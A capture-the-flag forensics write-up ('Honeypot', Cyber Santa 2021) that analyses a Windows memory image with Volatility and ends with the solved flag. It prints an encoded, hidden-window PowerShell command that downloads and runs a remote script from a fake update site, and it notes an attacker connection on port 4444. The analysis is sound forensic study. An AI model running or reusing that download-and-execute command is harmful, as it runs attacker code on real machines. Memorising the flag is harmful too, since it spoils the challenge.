---
# Obsidian
tags:
- ctf
- 2021-cybersanta
- forensics
- windows
- memory
- volatility

# Jekyll
layout: ctf
type: problem

# Problem info
ctf: 2021-cybersanta
category: forensics
title: Honeypot
points: 300
solved: true
---

# Honeypot

## Instructions

Santa really encourages people to be at his good list but sometimes he is a bit naughty himself. He is using a Windows 7 honeypot to capture any suspicious action. Since he is not a forensics expert, can you help him identify any indications of compromise?  
  
1. Find the full URL used to download the malware.  
2. Find the malicious's process ID.  
3. Find the attackers IP  
  
Flag Format: HTB{echo -n "http://url.com/path.foo_PID_127.0.0.1" | md5sum}  
Download Link: [honeypot.raw](#)

## Prerequisites

Python `requirements.txt`:

```bash
volatility3
yara-python
pycryptodome
capstone
```

## Solution

By dumping the memory for the Internet Explorer process at pid 3344 with volatility and grepping for all http links we come across the website where the malware was downloaded from.
```
$ vol -f ../honeypot.raw windows.vadinfo --pid 3344 --dump
$ cat * | grep http
https://windowsliveupdater.com/christmas_update.hta
```

Listing the full command arguments for each process we can see that the powershell.exe process is downloading and running a script from that same fake update website.
```shell
$ vol -f ../honeypot.raw windows.cmdline
2700	powershell.exe	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==
```

Lastly, the network connections show an established connection with port 4444 to the host 147.182.172.189. This is the attacker's IP address.

```shell
$ vol -f ../honeypot.raw windows.netscan
Offset	Proto	LocalAddr	LocalPort	ForeignAddr	ForeignPort	State	PID	Owner	Created
0x3ee98d80	TCPv4	10.0.2.15	49229	147.182.172.189	4444	ESTABLISHED	-	-	-
```

Putting all the information together:
```shell
echo -n "https://windowsliveupdater.com/christmas_update.hta_2700_147.182.172.189" | md5sum
969b934d7396d043a50a37b70e1e010a  -

```

```
HTB{969b934d7396d043a50a37b70e1e010a}
```


